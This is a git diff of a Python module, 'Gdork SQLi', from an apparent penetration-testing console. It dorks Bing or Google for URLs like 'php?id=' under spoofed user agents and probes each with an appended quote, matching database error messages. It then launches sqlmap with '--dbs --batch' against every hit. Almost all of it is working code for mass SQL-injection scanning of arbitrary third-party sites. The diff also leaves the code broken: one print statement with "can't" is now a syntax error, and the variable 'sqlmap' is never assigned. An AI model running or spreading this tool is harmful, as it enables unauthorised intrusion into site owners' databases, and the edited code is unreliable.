@@ -14,29 +14,43 @@ import random                       # Shuffle between user agents
 import time                         # Printing time when scraping and checking urls
 from time import sleep              # Multiple use cases, e.g. sleep between requests
 from bs4 import BeautifulSoup       # Working with website date
-from core.colors import bc as bc
-import core.commands as comm
-import core.modules as cmodules
+try:
+    import core.core as core
+    import core.commands as comm
+    import core.modules as cmodules
+    from core.colors import bc as bc
+except:
+    import sys
+    sys.path.append('././')
+    import core.core as core
+    import core.commands as comm
+    import core.modules as cmodules
+    from core.colors import bc as bc
+
+
+# START Log files, global variables, etc.
+config = core.config()
+global sqlmap
+SQLMAP_SYM = (config['TOOLS']['SQLMAP_SYM'])
 
 # Variables which needs to be defined
-filenameRawUrl = "0"
-filenameVulnUrl = "0"
-sqlmappath = 'sqlmap'
-
+filenameRawUrl = '0'
+filenameVulnUrl = '0'
+# END Log files, global variables, etc.
 
 # OPTIONS
 class options():
-    Author = "Thomas TJ (TTJ)"
+    Author = 'Thomas TJ (TTJ)'
     Name = 'Gdork SQLi'
     Call = 'gdsqli'
-    Modulename = "gdorksqli"
-    Version = "0.1"
-    Description = "Scrape net for urls and check if they are prone to SQL injection"
+    Modulename = 'gdorksqli'
+    Version = '0.1'
+    Description = 'Scrape net for urls and check if they are prone to SQL injection'
     Category = 'sql'
     Type = 'sin'
-    Datecreation = "03/12/2016"
-    Lastmodified = "03/12/2016"
-    License = "MIT"
+    Datecreation = '2017/01/01'
+    Lastmodified = '2017/01/01'
+    License = 'MIT'
 
     def __init__(self, basesearch, searchprovider, maxperpage, maxpages, startpage, timeout, savesearch, filename, verboseactive):
         self.basesearch = basesearch
@@ -56,37 +70,37 @@ class options():
 
     def show_opt(self):
         print(
-            ""
-            + "\n\t" + bc.OKBLUE + ("%-*s %-*s %-*s %s" % (12, "OPTION", 8, "RQ", 14, "VALUE", "DESCRIPTION")) + bc.ENDC
-            + "\n\t" + ("%-*s %-*s %-*s %s" % (12, "------", 8, "--", 14, "-----", "-----------"))
-            + "\n\t" + ("%-*s %-*s %-*s %s" % (12, "base:", 8, "y", 14, self.basesearch, "Basesearch could be: php?id=, php?cat=, e.g."))
-            + "\n\t" + ("%-*s %-*s %-*s %s" % (12, "searcher:", 8, "y", 14, self.searchprovider, "Bing or Google (b/g)"))
-            + "\n\t" + ("%-*s %-*s %-*s %s" % (12, "maxperpage:", 8, "y", 14, self.maxperpage, "Results per page"))
-            + "\n\t" + ("%-*s %-*s %-*s %s" % (12, "maxpages:", 8, "y", 14, self.maxpages, "Max pages to search"))
-            + "\n\t" + ("%-*s %-*s %-*s %s" % (12, "startpage:", 8, "y", 14, self.startpage, "Start page"))
-            + "\n\t" + ("%-*s %-*s %-*s %s" % (12, "timeout:", 8, "y", 14, self.timeout, "Timeout between request"))
-            + "\n\t" + ("%-*s %-*s %-*s %s" % (12, "savesearch:", 8, "y", 14, self.savesearch, "Save search results to file"))
-            + "\n\t" + ("%-*s %-*s %-*s %s" % (12, "filename:", 8, "n", 14, self.filename, "Filename base for search results"))
-            + "\n\t" + ("%-*s %-*s %-*s %s" % (12, "verbose:", 8, "n", 14, self.verboseactive, "Verbose level (0, 1, 2)"))
-            + "\n"
+            ''
+            + '\n\t' + bc.OKBLUE + ('%-*s %-*s %-*s %s' % (12, 'OPTION', 8, 'RQ', 14, 'VALUE', 'DESCRIPTION')) + bc.ENDC
+            + '\n\t' + ('%-*s %-*s %-*s %s' % (12, '------', 8, '--', 14, '-----', '-----------'))
+            + '\n\t' + ('%-*s %-*s %-*s %s' % (12, 'base:', 8, 'y', 14, self.basesearch, 'Basesearch could be: php?id=, php?cat=, e.g.'))
+            + '\n\t' + ('%-*s %-*s %-*s %s' % (12, 'searcher:', 8, 'y', 14, self.searchprovider, 'Bing or Google (b/g)'))
+            + '\n\t' + ('%-*s %-*s %-*s %s' % (12, 'maxperpage:', 8, 'y', 14, self.maxperpage, 'Results per page'))
+            + '\n\t' + ('%-*s %-*s %-*s %s' % (12, 'maxpages:', 8, 'y', 14, self.maxpages, 'Max pages to search'))
+            + '\n\t' + ('%-*s %-*s %-*s %s' % (12, 'startpage:', 8, 'y', 14, self.startpage, 'Start page'))
+            + '\n\t' + ('%-*s %-*s %-*s %s' % (12, 'timeout:', 8, 'y', 14, self.timeout, 'Timeout between request'))
+            + '\n\t' + ('%-*s %-*s %-*s %s' % (12, 'savesearch:', 8, 'y', 14, self.savesearch, 'Save search results to file'))
+            + '\n\t' + ('%-*s %-*s %-*s %s' % (12, 'filename:', 8, 'n', 14, self.filename, 'Filename base for search results'))
+            + '\n\t' + ('%-*s %-*s %-*s %s' % (12, 'verbose:', 8, 'n', 14, self.verboseactive, 'Verbose level (0, 1, 2)'))
+            + '\n'
             )
 
     # Show commands
     def show_commands(self):
         print(
-            ""
-            + "\n\t" + bc.OKBLUE + "COMMANDS:" + bc.ENDC
-            + "\n\t" + "---------"
-            + "\n\t" + ("%-*s ->\t%s" % (9, "run", "Run the script"))
-            # + "\n\t" + ("%-*s ->\t%s" % (9, "runcom", "Run program with specific arguments"))
-            + "\n\t" + ("%-*s ->\t%s" % (9, "info", "Information"))
-            + "\n\t" + ("%-*s ->\t%s" % (9, "help", "Help"))
-            # + "\n\t" + ("%-*s ->\t%s" % (9, "pd", "Predefined arguments for 'runcom'"))
-            + "\n\t" + ("%-*s ->\t%s" % (9, "so", "Show options"))
-            + "\n\t" + ("%-*s ->\t%s" % (9, "sa", "Show module info"))
+            ''
+            + '\n\t' + bc.OKBLUE + 'COMMANDS:' + bc.ENDC
+            + '\n\t' + '---------'
+            + '\n\t' + ('%-*s ->\t%s' % (9, 'run', 'Run the script'))
+            # + '\n\t' + ('%-*s ->\t%s' % (9, 'runcom', 'Run program with specific arguments'))
+            + '\n\t' + ('%-*s ->\t%s' % (9, 'info', 'Information'))
+            + '\n\t' + ('%-*s ->\t%s' % (9, 'help', 'Help'))
+            # + '\n\t' + ('%-*s ->\t%s' % (9, 'pd', 'Predefined arguments for 'runcom''))
+            + '\n\t' + ('%-*s ->\t%s' % (9, 'so', 'Show options'))
+            + '\n\t' + ('%-*s ->\t%s' % (9, 'sa', 'Show module info'))
             + '\n\t' + ('%-*s ->\t%s' % (9, 'invoke', 'Invoke module'))
-            + "\n\t" + ("%-*s ->\t%s" % (9, "exit", "Exit"))
-            + "\n"
+            + '\n\t' + ('%-*s ->\t%s' % (9, 'exit', 'Exit'))
+            + '\n'
             )
 
     # Show all info
@@ -108,7 +122,7 @@ class options():
 # END OPTIONS
 
 
-def LoadUserAgents(uafile="files/user_agents.txt"):
+def LoadUserAgents(uafile='files/user_agents.txt'):
     # uafile : string, path to text file of user agents, one per line
     uas = []
     with open(uafile, 'rb') as uaf:
@@ -131,19 +145,19 @@ def run():
     verboseactive = sop.verboseactive
 
     filename_tmp = filename
-    if savesearch.lower() == "y":
+    if savesearch.lower() == 'y':
         filename_tmp = filename_tmp + '_rawurls.txt'
         if not os.path.isfile(filename_tmp):
             os.mknod(filename_tmp)
         else:
-            appendtofile = input("\t->  " + bc.WARN + "wmd" + bc.ENDC + "@" + bc.WARN + "fileExists - append (Y/n):" + bc.ENDC + " ")
-            if appendtofile == "n":
-                print(bc.WARNING + "\t[!]- User disallowed appending to resultfile")
-                print(bc.WARNING + "\t[!]- Please try again with another filename")
-                print(bc.WARNING + "\t[!]- Exiting")
+            appendtofile = input('\t->  ' + bc.WARN + 'wmd' + bc.ENDC + '@' + bc.WARN + 'fileExists - append (Y/n):' + bc.ENDC + ' ')
+            if appendtofile == 'n':
+                print(bc.WARNING + '\t[!]- User disallowed appending to resultfile')
+                print(bc.WARNING + '\t[!]- Please try again with another filename')
+                print(bc.WARNING + '\t[!]- Exiting')
                 sys.exit()
     else:
-        filename_tmp = "logs/gdorksqli_rawurls"
+        filename_tmp = 'logs/gdorksqli_rawurls'
 
     # =================================
     # Make variables ready to use
@@ -155,8 +169,8 @@ def run():
     string = str(basesearch)
     stringurl = urllib.parse.quote_plus(string)
 
-    print(bc.ENDC + "\n\t[*]:: Searching")
-    print("\t[+]  Results")
+    print(bc.ENDC + '\n\t[*]:: Searching')
+    print('\t[+]  Results')
 
     searchUrlForString(searchprovider, count, startpage, pages, sleeptime, string, stringurl, savesearch, filename, filename_tmp, verboseactive)
 
@@ -170,14 +184,14 @@ def searchUrlForString(searchprovider, count, startpage, pages, sleeptime, strin
         # =========================
         # Bing search
         # =========================
-        if searchprovider == "b":
+        if searchprovider == 'b':
             pagenr = int(start)*int(count)+1
-            address = "http://www.bing.com/search?q=instreamset:(url title):" + stringurl + "&count=" + count + "&first=" + str(pagenr)
-            print("\t[*]  Page number: " + str(int(start)+1))
+            address = 'http://www.bing.com/search?q=instreamset:(url title):' + stringurl + '&count=' + count + '&first=' + str(pagenr)
+            print('\t[*]  Page number: ' + str(int(start)+1))
             # Loading random useragent
             uas = LoadUserAgents()
             ua = random.choice(uas)  # select a random user agent
-            headers = {"Connection": "close", "User-Agent": ua}
+            headers = {'Connection': 'close', 'User-Agent': ua}
             r = requests.get(address, headers=headers)
             soup = BeautifulSoup(r.text, 'lxml')
             for d in soup.find_all('h2'):
@@ -185,14 +199,14 @@ def searchUrlForString(searchprovider, count, startpage, pages, sleeptime, strin
                     if string in a['href']:
                         print(
                             bc.OKGREEN
-                            + "\t["
-                            + time.strftime("%H:%M:%S")
-                            + "]  [+]  " + a['href'] + bc.ENDC
+                            + '\t['
+                            + time.strftime('%H:%M:%S')
+                            + ']  [+]  ' + a['href'] + bc.ENDC
                             )
                         if filename_tmp:
                             with open(filename_tmp, 'a') as file:
-                                file.write(a['href'] + "\n")
-                    elif "0.r.msn." in a['href']:
+                                file.write(a['href'] + '\n')
+                    elif '0.r.msn.' in a['href']:
                         pass
                     else:
                         pass
@@ -201,15 +215,15 @@ def searchUrlForString(searchprovider, count, startpage, pages, sleeptime, strin
         # =========================
         # Google search
         # =========================
-        elif searchprovider == "g":
+        elif searchprovider == 'g':
             pagenr = int(start)*int(count)
-            address = "https://www.google.dk/search?q=" + stringurl + "&num=" + count + "&start=" + str(pagenr)
-            # address = "https://www.google.dk/search?q=inurl%3A" + stringurl + "&num=" + count + "&start=" + str(pagenr)
-            print("\t[*]  Page number: " + str(int(start)+1))
+            address = 'https://www.google.dk/search?q=' + stringurl + '&num=' + count + '&start=' + str(pagenr)
+            # address = 'https://www.google.dk/search?q=inurl%3A' + stringurl + '&num=' + count + '&start=' + str(pagenr)
+            print('\t[*]  Page number: ' + str(int(start)+1))
             # Loading random useragent
             uas = LoadUserAgents()
             ua = random.choice(uas)  # select a random user agent
-            headers = {"Connection": "close", "User-Agent": ua}
+            headers = {'Connection': 'close', 'User-Agent': ua}
             r = requests.get(address, headers=headers)
             soup = BeautifulSoup(r.text, 'lxml')
             for d in soup.find_all('cite'):
@@ -217,45 +231,45 @@ def searchUrlForString(searchprovider, count, startpage, pages, sleeptime, strin
                 if string in url:
                     print(
                         bc.OKGREEN
-                        + " \t["
-                        + time.strftime("%H:%M:%S")
-                        + "]  [+]  " + url + bc.ENDC
+                        + ' \t['
+                        + time.strftime('%H:%M:%S')
+                        + ']  [+]  ' + url + bc.ENDC
                         )
-                    if filename_tmp == "y":
+                    if filename_tmp == 'y':
                         with open(filename_tmp, 'a') as file:
-                            file.write(url + "\n")
+                            file.write(url + '\n')
             sleep(sleeptime)
         try:
-            print("")
+            print('')
 
         # =============================
         # Error, end, exit
         # =============================
         # Add delete of file if savesearch n
         except KeyboardInterrupt:
-            print(bc.FAIL + "  User input - Ctrl + c" + bc.ENDC)
-            quitnow = input(bc.ENDC + bc.BOLD + "    Exit program (y/N): " + bc.OKBLUE)
-            if quitnow == "y":
-                print(bc.ENDC + "\t[!] Exiting\n\n")
+            print(bc.FAIL + '  User input - Ctrl + c' + bc.ENDC)
+            quitnow = input(bc.ENDC + bc.BOLD + '    Exit program (y/N): ' + bc.OKBLUE)
+            if quitnow == 'y':
+                print(bc.ENDC + '\t[!] Exiting\n\n')
                 return None
             else:
-                print(bc.ENDC + "\t[!] Continuing\n\n")
+                print(bc.ENDC + '\t[!] Continuing\n\n')
         except:
-            print(bc.FAIL + "\t[!] ERROR!!! " + bc.ENDC)
+            print(bc.FAIL + '\t[!] ERROR!!! ' + bc.ENDC)
 
     # =================================
     # Done - sum it up
     # =================================
-    print("\n\t[+] Done scraping")
+    print('\n\t[+] Done scraping')
     with open(filename_tmp) as f:
         resultsnumber = sum(1 for _ in f)
-    if savesearch == "y":
-        print("\t[+] Scraping saved in file: " + filename_tmp)
-        print("\t[+] Total saved urls:  " + str(resultsnumber))
+    if savesearch == 'y':
+        print('\t[+] Scraping saved in file: ' + filename_tmp)
+        print('\t[+] Total saved urls:  ' + str(resultsnumber))
     else:
-        print("\t[+] Total urls collected:  " + str(resultsnumber))
+        print('\t[+] Total urls collected:  ' + str(resultsnumber))
     if resultsnumber == 0:
-        print(bc.FAIL + "\t[-] No urls collected, exiting!")
+        print(bc.FAIL + '\t[-] No urls collected, exiting!')
         return None
 
     checkUrlsForVuln(filename, filename_tmp, savesearch, verboseactive)
@@ -263,36 +277,36 @@ def searchUrlForString(searchprovider, count, startpage, pages, sleeptime, strin
 
 def checkUrlsForVuln(filename, filenameRawUrl, savesearch, verboseactive):
 
-    print("\n\n\n" + bc.HEADER)
-    print("\t[*] Checking URLs for vuln")
-    print("\n" + bc.ENDC)
+    print('\n\n\n' + bc.HEADER)
+    print('\t[*] Checking URLs for vuln')
+    print('\n' + bc.ENDC)
 
     # Base input
-    if filenameRawUrl != "0":
+    if filenameRawUrl != '0':
         urlfile = filenameRawUrl
 
     if not os.path.isfile(urlfile):
-        print(bc.FAIL + "\t[*] URL file does not exist or no vuln urls.")
-        print(bc.FAIL + "  Exiting")
+        print(bc.FAIL + '\t[*] URL file does not exist or no vuln urls.')
+        print(bc.FAIL + '  Exiting')
         return None
 
-    if savesearch == "y":
+    if savesearch == 'y':
         if not os.path.isfile(filename):
             os.mknod(filename)
         else:
             print('\t[!]  File already exists!')
             print('\t[!]  Append to file? Press enter for yes. (y/n)')
-            appendtofile = input("\t->  " + bc.WARN + "wmd" + bc.ENDC + "@" + bc.WARN + "fileExists:" + bc.ENDC + " ")
-            if appendtofile == "n":
-                print("\t[!] User disallowed appending to resultfile")
-                print("\t[!] Please try again with another filename")
-                print("\t[!] Exiting\n\n")
+            appendtofile = input('\t->  ' + bc.WARN + 'wmd' + bc.ENDC + '@' + bc.WARN + 'fileExists:' + bc.ENDC + ' ')
+            if appendtofile == 'n':
+                print('\t[!] User disallowed appending to resultfile')
+                print('\t[!] Please try again with another filename')
+                print('\t[!] Exiting\n\n')
                 return None
     else:
-        filename = "0"
+        filename = '0'
 
-    print(bc.ENDC + "\n\t[*]::Reading file\n")
-    print("\t[*]  Connecting\n")
+    print(bc.ENDC + '\n\t[*]::Reading file\n')
+    print('\t[*]  Connecting\n')
 
     # =================================
     # Loop through urls and add a qoute
@@ -316,14 +330,14 @@ def checkUrlsForVuln(filename, filenameRawUrl, savesearch, verboseactive):
                 # Get data
                 url = line + "'"
                 print(
-                    "\t["
-                    + time.strftime("%H:%M:%S")
-                    + "]  [*]  " + line.strip('\n')
+                    '\t['
+                    + time.strftime('%H:%M:%S')
+                    + ']  [*]  ' + line.strip('\n')
                     )
                 # Loading random useragent
                 uas = LoadUserAgents()
                 ua = random.choice(uas)  # select a random user agent
-                headers = {"Connection": "close", "User-Agent": ua}
+                headers = {'Connection': 'close', 'User-Agent': ua}
                 r = requests.get(url, headers=headers)
                 soup = BeautifulSoup(r.text, 'lxml')
 
@@ -346,135 +360,135 @@ def checkUrlsForVuln(filename, filenameRawUrl, savesearch, verboseactive):
                 checkPO2 = len(soup.find_all(text=re.compile('unterminated quoted string at or near')))
 
                 # Verbose level 1
-                if verboseactive == "1":
-                    print("\t[V]  Check1 MySQL found:    " + str(checkMY1))
-                    print("\t[V]  Check2 MySQL found:    " + str(checkMY2))
-                    print("\t[V]  Check3 MySQL found:    " + str(checkMY3))
-                    print("\t[V]  Check4 MySQL found:    " + str(checkMY4))
-                    print("\t[V]  Check5 MS SQL found:   " + str(checkMS1))
-                    print("\t[V]  Check6 MS SQL found:   " + str(checkMS2))
-                    print("\t[V]  Check7 MS SQL found:   " + str(checkMS3))
-                    print("\t[V]  Check8 Oracle found:   " + str(checkOR1))
-                    print("\t[V]  Check9 Oracle found:   " + str(checkOR2))
-                    print("\t[V]  Check10 Oracle found:  " + str(checkOR3))
-                    print("\t[V]  Check11 Postgre found: " + str(checkPO1))
-                    print("\t[V]  Check12 Postgre found: " + str(checkPO2))
+                if verboseactive == '1':
+                    print('\t[V]  Check1 MySQL found:    ' + str(checkMY1))
+                    print('\t[V]  Check2 MySQL found:    ' + str(checkMY2))
+                    print('\t[V]  Check3 MySQL found:    ' + str(checkMY3))
+                    print('\t[V]  Check4 MySQL found:    ' + str(checkMY4))
+                    print('\t[V]  Check5 MS SQL found:   ' + str(checkMS1))
+                    print('\t[V]  Check6 MS SQL found:   ' + str(checkMS2))
+                    print('\t[V]  Check7 MS SQL found:   ' + str(checkMS3))
+                    print('\t[V]  Check8 Oracle found:   ' + str(checkOR1))
+                    print('\t[V]  Check9 Oracle found:   ' + str(checkOR2))
+                    print('\t[V]  Check10 Oracle found:  ' + str(checkOR3))
+                    print('\t[V]  Check11 Postgre found: ' + str(checkPO1))
+                    print('\t[V]  Check12 Postgre found: ' + str(checkPO2))
 
                 # Verbose level 2
-                if verboseactive == "2":
+                if verboseactive == '2':
                     checkverMY1 = soup.find(text=re.compile('check the manual that corresponds to your MySQL'))
                     checkverMY2 = soup.find(text=re.compile(r'SQL syntax'))
                     checkverMY3 = soup.find(text=re.compile(r'server version for the right syntax'))
                     checkverMY4 = soup.find(text=re.compile('expects parameter 1 to be'))
-                    print("\t[V]  Check1 MySQL found:    " + str(checkverMY1).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
-                    print("\t[V]  Check2 MySQL found:    " + str(checkverMY2).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
-                    print("\t[V]  Check3 MySQL found:    " + str(checkverMY3).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
-                    print("\t[V]  Check4 MySQL found:    " + str(checkverMY4).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
+                    print('\t[V]  Check1 MySQL found:    ' + str(checkverMY1).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
+                    print('\t[V]  Check2 MySQL found:    ' + str(checkverMY2).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
+                    print('\t[V]  Check3 MySQL found:    ' + str(checkverMY3).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
+                    print('\t[V]  Check4 MySQL found:    ' + str(checkverMY4).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
 
                     checkverMS1 = soup.find(text=re.compile('Unclosed quotation mark before the character string'))
                     checkverMS2 = soup.find(text=re.compile('An unhanded exception occurred during the execution'))
                     checkverMS3 = soup.find(text=re.compile('Please review the stack trace for more information'))
-                    print("\t[V]  Check5 MS SQL found:   " + str(checkverMS1).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
-                    print("\t[V]  Check6 MS SQL found:   " + str(checkverMS2).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
-                    print("\t[V]  Check7 MS SQL found:   " + str(checkverMS3).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
+                    print('\t[V]  Check5 MS SQL found:   ' + str(checkverMS1).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
+                    print('\t[V]  Check6 MS SQL found:   ' + str(checkverMS2).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
+                    print('\t[V]  Check7 MS SQL found:   ' + str(checkverMS3).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
 
                     checkverOR1 = soup.find(text=re.compile('java.sql.SQLException: ORA-00933'))
                     checkverOR2 = soup.find(text=re.compile('SQLExceptionjava.sql.SQLException'))
                     checkverOR3 = soup.find(text=re.compile('quoted string not properly terminated'))
-                    print("\t[V]  Check8 Oracle found:   " + str(checkverOR1).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
-                    print("\t[V]  Check9 Oracle found:   " + str(checkverOR2).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
-                    print("\t[V]  Check10 Oracle found:  " + str(checkverOR3).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
+                    print('\t[V]  Check8 Oracle found:   ' + str(checkverOR1).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
+                    print('\t[V]  Check9 Oracle found:   ' + str(checkverOR2).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
+                    print('\t[V]  Check10 Oracle found:  ' + str(checkverOR3).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
 
                     checkverPO1 = soup.find(text=re.compile('Query failed:'))
                     checkverPO2 = soup.find(text=re.compile('unterminated quoted string at or near'))
-                    print("\t[V]  Check11 Postgre found: " + str(checkverPO1).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
-                    print("\t[V]  Check12 Postgre found: " + str(checkverPO2).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
+                    print('\t[V]  Check11 Postgre found: ' + str(checkverPO1).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
+                    print('\t[V]  Check12 Postgre found: ' + str(checkverPO2).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
 
                 # If X is vuln
                 if (checkMY1 > 0 or checkMY2 > 0 or checkMY3 > 0 or checkMY4 > 0 or checkMS1 > 0 or checkMS2 > 0 or checkMS3 > 0 or checkOR1 > 0 or checkOR2 > 0 or checkOR3 > 0 or checkPO1 > 0 or checkPO2):
                     print(
                         bc.OKGREEN
-                        + "\n"
-                        + "                   Possible vuln url!"
-                        + "\n"
-                        + "\t["
-                        + time.strftime("%H:%M:%S")
-                        + "]  [+]  "
+                        + '\n'
+                        + '                   Possible vuln url!'
+                        + '\n'
+                        + '\t['
+                        + time.strftime('%H:%M:%S')
+                        + ']  [+]  '
                         + line + bc.ENDC
-                        + "\n"
+                        + '\n'
                         )
-                    if savesearch == "y":
+                    if savesearch == 'y':
                         with open(filename, 'a') as file:
                             file.write(line)
                 else:
                     print(
                         bc.WARNING
-                        + "\t["
-                        + time.strftime("%H:%M:%S")
-                        + "]  [-]  " + line + bc.ENDC
+                        + '\t['
+                        + time.strftime('%H:%M:%S')
+                        + ']  [-]  ' + line + bc.ENDC
                         )
 
             # Skip X or/and exit
             except KeyboardInterrupt:
-                print(bc.FAIL + "\t[X]  " + line + bc.ENDC)
+                print(bc.FAIL + '\t[X]  ' + line + bc.ENDC)
                 print('\t[!] Quit? Press enter for continue, or n for quit (y/n)')
-                quitnow = input("\t->  " + bc.WARN + "wmd" + bc.ENDC + "@" + bc.WARN + "quit:" + bc.ENDC + " ")
-                if quitnow == "y":
-                    print(bc.ENDC + "\t[!] Exiting\n\n")
+                quitnow = input('\t->  ' + bc.WARN + 'wmd' + bc.ENDC + '@' + bc.WARN + 'quit:' + bc.ENDC + ' ')
+                if quitnow == 'y':
+                    print(bc.ENDC + '\t[!] Exiting\n\n')
                     return None
                 else:
-                    print(bc.ENDC + "\t[!] Continuing\n\n")
+                    print(bc.ENDC + '\t[!] Continuing\n\n')
 
             # Bad X
             except:
-                print(bc.FAIL + "\t[X]  " + line + bc.ENDC)
+                print(bc.FAIL + '\t[X]  ' + line + bc.ENDC)
 
     # =================================
     # Done - sum it up
     # =================================
-    print("\n\t[+] Done scanning urls")
-    if savesearch == "y":
+    print('\n\t[+] Done scanning urls')
+    if savesearch == 'y':
         with open(filename) as f:
             resultsnumber = sum(1 for _ in f)
-        print("\t[+] Scraping saved in file: " + filename)
-        print("\t[+] Total saved urls:  " + str(resultsnumber))
+        print('\t[+] Scraping saved in file: ' + filename)
+        print('\t[+] Total saved urls:  ' + str(resultsnumber))
         if resultsnumber == 0:
-            print("\t[+] No vuln urls, exiting\n\n")
+            print('\t[+] No vuln urls, exiting\n\n')
             return None
     print('\t[!]  Run vuln urls through SQLmap (y/n)?')
-    checkurls = input("\t->  " + bc.WARN + "wmd" + bc.ENDC + "@" + bc.WARN + "runSQLmap:" + bc.ENDC + " ")
-    if checkurls == "y":
+    checkurls = input('\t->  ' + bc.WARN + 'wmd' + bc.ENDC + '@' + bc.WARN + 'runSQLmap:' + bc.ENDC + ' ')
+    if checkurls == 'y':
         scanUrlsSQLmap(filename)
     else:
-        print(bc.ENDC + "\t[!] Exiting\n\n")
+        print(bc.ENDC + '\t[!] Exiting\n\n')
         return None
 
 
 def scanUrlsSQLmap(filenameVulnUrl):
-    print("\n\n\n" + bc.HEADER)
-    print("\t[*] Starting SQLmap")
-    print("\n" + bc.ENDC)
+    print('\n\n\n' + bc.HEADER)
+    print('\t[*] Starting SQLmap')
+    print('\n' + bc.ENDC)
 
     # =================================
     # Check if sqlmap installed, file, etc.
     # =================================
 
     if shutil.which('sqlmap') is None:
-        print("\t[!] SQLmap is not installed on system - can't go on.")
-        print("\t[!] Install sqlmap and run command below (sudo pacman -S sqlmap, sudo apt-get install sqlmap, etc.)")
-        print("\n\t[!] Command:")
-        print("\t[*] sqlmap -m \"" + filenameVulnUrl + "\n")
+        print('\t[!] SQLmap is not installed on system - can't go on.')
+        print('\t[!] Install sqlmap and run command below (sudo pacman -S sqlmap, sudo apt-get install sqlmap, etc.)')
+        print('\n\t[!] Command:')
+        print('\t[*] ' + sqlmap + ' -m \'' + filenameVulnUrl + '\n')
     else:
-        if filenameVulnUrl == "0":
-            print("\t[!] No filename in memory, please specify.")
+        if filenameVulnUrl == '0':
+            print('\t[!] No filename in memory, please specify.')
             return None
 
-    print(bc.ENDC + "\t[*] SQLmap will be started with arguments dbs, batch, random-agent, 4xthreads.")
+    print(bc.ENDC + '\t[*] SQLmap will be started with arguments dbs, batch, random-agent, 4xthreads.')
 
-    fileDestination = (os.getcwd() + "/" + filenameVulnUrl)
-    command = ('sqlmap -m ' + fileDestination + " --dbs --batch --random-agent --threads 4")
-    print("\t[*] Command to execute: " + command)
-    print(bc.BOLD + "\t[*] Press Ctrl + c to exit\n\n\n")
+    fileDestination = (os.getcwd() + '/' + filenameVulnUrl)
+    command = (sqlmap + ' -m ' + fileDestination + ' --dbs --batch --random-agent --threads 4')
+    print('\t[*] Command to execute: ' + command)
+    print(bc.BOLD + '\t[*] Press Ctrl + c to exit\n\n\n')
 
     # RUN SQLMAP !!
     os.system(command)
@@ -482,17 +496,17 @@ def scanUrlsSQLmap(filenameVulnUrl):
     # Not implemented - specify saving destination
     # @type  savingplace: str
     # @param savingplace: Who should perform the search.
-    # savingplace = input(bc.ENDC + "  Specify folder where results will be placed: " + bc.OKBLUE)
+    # savingplace = input(bc.ENDC + '  Specify folder where results will be placed: ' + bc.OKBLUE)
     # if savingplace not in ('b', 'g'):
-    #    print(bc.WARNING + "  - Wrong input - only 'b' and 'g' allowed. Using 'b'")
+    #    print(bc.WARNING + '  - Wrong input - only 'b' and 'g' allowed. Using 'b'')
     #    savingplace = 'b'
 
 
 def justCheckUrls():
-    print("  Filepath from run is still in memory: " + filenameRawUrl)
-    urlfileChoose = input(bc.ENDC + "  (i)nput new filename, or (u)se from memory (i/U): " + bc.OKBLUE)
+    print('  Filepath from run is still in memory: ' + filenameRawUrl)
+    urlfileChoose = input(bc.ENDC + '  (i)nput new filename, or (u)se from memory (i/U): ' + bc.OKBLUE)
     if urlfileChoose not in ('i', 'u'):
-        print(bc.WARNING + "  - Using from memory")
+        print(bc.WARNING + '  - Using from memory')
         urlfileChoose = 'u'
     if urlfileChoose == 'u':
         pass
@@ -544,7 +558,7 @@ def info():
 
 # CONSOLE
 def console():
-    valueQ = input("  " + bc.FAIL + "mdw" + bc.ENDC + "@" + bc.FAIL + "gdsqli:" + bc.ENDC + " ")
+    valueQ = input('  ' + bc.FAIL + 'mdw' + bc.ENDC + '@' + bc.FAIL + 'gdsqli:' + bc.ENDC + ' ')
     userinput = valueQ.split()
     if 'so' in userinput[:1]:
         sop.show_opt()
@@ -554,7 +568,7 @@ def console():
         print('\n\n###########################################################')
         print('#  SQLmap')
         print('###########################################################\n')
-        os.system(sqlmappath + ' --help')
+        os.system(sqlmap + ' --help')
         print('\n\n###########################################################\n\n')
     elif 'info' in userinput[:1]:
         info()
@@ -564,33 +578,35 @@ def console():
         useroption = str(userinput[1:2]).strip('[]\'')
         uservalue = str(userinput[2:3]).strip('[]\'')
         if useroption not in sop.poss_opt():
-            print(bc.WARN + "\n    Error, no options for: " + useroption + "\n" + bc.ENDC)
+            print(bc.WARN + '\n    Error, no options for: ' + useroption + '\n' + bc.ENDC)
         elif useroption in sop.poss_opt():
             setattr(sop, useroption, uservalue)
-            print('\n      ' + useroption + '\t> ' + uservalue + "\n")
+            print('\n      ' + useroption + '\t> ' + uservalue + '\n')
     elif 'invoke' in userinput[:1]:
         comm.invokeModule(options.Call)
         return None
     elif 'back' in userinput[:1] or 'exit' in userinput[:1]:
         return None
     else:
-        print(bc.WARNING + "\n    error\t> " + str(userinput[:1]) + "\n" + bc.ENDC)
+        print(bc.WARNING + '\n    error\t> ' + str(userinput[:1]) + '\n' + bc.ENDC)
     # Always return to console:
     console()
 # END console
 
 
 def main():
-    print("\n\n")
-    print("      _____           __   _____ ____    __       _         _           __  _           ")
-    print("     / __(_)___  ____/ /  / ___// __ \  / /      (_)___    (_)__  _____/ /_(_)___  ____ ")
